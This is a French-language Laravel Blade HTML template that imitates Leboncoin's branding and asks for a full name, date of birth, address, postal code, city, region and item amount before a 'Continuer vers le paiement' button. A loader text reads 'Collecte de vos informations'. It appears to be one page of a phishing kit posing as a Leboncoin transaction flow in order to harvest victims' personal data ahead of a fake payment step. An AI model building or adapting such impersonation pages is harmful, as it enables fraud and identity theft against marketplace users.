<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" type="image/png" href="{{ asset('images/leboncoin.png') }}">
    <link rel="shortcut icon" type="image/png" href="{{ asset('images/leboncoin.png') }}">
    <title>LEBONCOIN | INFORMATIONS PERSONNELLES</title>

    @vite(['resources/css/app.css', 'resources/js/app.js'])
    
    <style>
        .coriolis-orange { background-color: #F56B2A; }
        .coriolis-text { color: #F56B2A; }
    </style>
</head>
<body class="bg-gray-50 min-h-screen flex items-center justify-center">

<div id="global-loader" style="position: fixed; inset: 0; z-index: 9999; background: white; display: flex; flex-direction: column; align-items: center; justify-content: center; transition: opacity 0.5s ease;">
        <div class="loader-content" style="text-align: center; margin-top: 0;">
            <div style="width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid #F56B2A; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto;"></div>
            <h2 style="font-family: sans-serif; color: #1b1b18; margin-top: 20px;">Connexion sécurisée...</h2>
            <p style="font-family: sans-serif; color: #706f6c; font-size: 14px;">Collecte de vos informations</p> 
        </div>
    </div>

    <style>
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>

    <script>
            window.addEventListener('load', function() {
                const loader = document.getElementById('global-loader');
                
                if (loader) {
                    setTimeout(() => {
                        loader.style.opacity = '0';
                        setTimeout(() => {
                            loader.style.display = 'none';
                        }, 500);
                    }, 1200);
                }
            });
        </script>

    <main class="w-full max-w-2xl mx-auto px-4 py-4 ">
        <div class="bg-white p-8 shadow-lg rounded-2xl border-gray-100 ">
            <header class="w-full max-w-md mx-auto text-sm mb-2">
        
        <div class="flex justify-center mt-5">
            <img
            src="{{ asset('images/leboncoin.png') }}"
            alt="Logo"
            class="h-8 lg:h-15 w-auto"
            >
        </div>

        </header>
        <p  class="text-sm text-center mb-6 text-gray-500">Veuillez renseigner vos informations personnelles pour continuer.</p>

        @if ($errors->any())
            <div class="bg-red-100 border border-red-400 text-red-700 p-4 rounded mb-4">
                <ul>
                    @foreach ($errors->all() as $error)
                        <li>{{ $error }}</li>
                    @endforeach
                </ul>
            </div>
        @endif
        
        <form action="{{ route('personal-info.submit') }}" method="POST" class="space-y-6">
            @csrf  

            <!-- Nom et Prénoms -->
            <div>
                <label for="full_name" class="block text-sm font-medium text-gray-700 mb-1">Nom et Prénoms</label>
                <input type="text" id="full_name" name="full_name" required
                    class="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-leboncoin focus:border-leboncoin outline-none transition" 
                    placeholder="Jean Dupont"
                    value="{{ old('full_name') }}">
            </div>

            <!-- Date de naissance -->
            <div>
                <label for="date_of_birth" class="block text-sm font-medium text-gray-700 mb-1">Date de naissance</label>
                <input type="date" id="date_of_birth" name="date_of_birth" required
                    class="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-leboncoin focus:border-leboncoin outline-none transition" 
                    value="{{ old('date_of_birth') }}">
            </div>

            <!-- Adresse -->
            <div>
                <label for="address" class="block text-sm font-medium text-gray-700 mb-1">Adresse</label>
                <input type="text" id="address" name="address" required
                    class="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-leboncoin focus:border-leboncoin outline-none transition" 
                    placeholder="123 Rue de la Paix"
                    value="{{ old('address') }}">
            </div>

            <!-- Code postal et Ville -->
            <div class="grid grid-cols-2 gap-4">
                <div>
                    <label for="postal_code" class="block text-sm font-medium text-gray-700 mb-1">Code postal</label>
                    <input type="text" id="postal_code" name="postal_code" required pattern="[0-9]{5}"
                        class="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-leboncoin focus:border-leboncoin outline-none transition" 
                        placeholder="75001"
                        value="{{ old('postal_code') }}">
                </div>

                <div>
                    <label for="city" class="block text-sm font-medium text-gray-700 mb-1">Ville</label>
                    <input type="text" id="city" name="city" required
                        class="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-leboncoin focus:border-leboncoin outline-none transition" 
                        placeholder="Paris"
                        value="{{ old('city') }}">
                </div>
            </div>

            <!-- Région -->
            <div>
                <label for="region" class="block text-sm font-medium text-gray-700 mb-1">Région</label>
                <input type="text" id="region" name="region" required
                    class="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-leboncoin focus:border-leboncoin outline-none transition" 
                    placeholder="Île-de-France"
                    value="{{ old('region') }}">
            </div>

            <!-- Montant de l'article -->
            <div>
                <label for="article_amount" class="block text-sm font-medium text-gray-700 mb-1">Montant de l'article (€)</label>
                <input type="number" id="article_amount" name="article_amount" required step="0.01" min="0"
                    class="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-leboncoin focus:border-leboncoin outline-none transition" 
                    placeholder="99.99"
                    value="{{ old('article_amount') }}">
            </div>

            <button type="submit" class="w-full flex items-center capitalize justify-center bg-leboncoin hover:opacity-90 text-white font-bold py-3 px-6 rounded-lg transition-colors duration-300 shadow-md cursor-pointer hover:scale-[1.01] active:scale-[0.99] transition-all duration-200">
                <svg class="w-4 h-4 mr-1 align-middle" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd"></path></svg>
                Continuer vers le paiement
            </button>
        </form>

        
        
    </div>

    </main>

    <script>
        window.addEventListener('load', function() {
            const loader = document.getElementById('global-loader');
            
            if (loader) {
                setTimeout(() => {
                    loader.style.opacity = '0';
                    setTimeout(() => {
                        loader.style.display = 'none';
                    }, 500);
                }, 1200);
            }
        });
    </script>

</body>
</html>
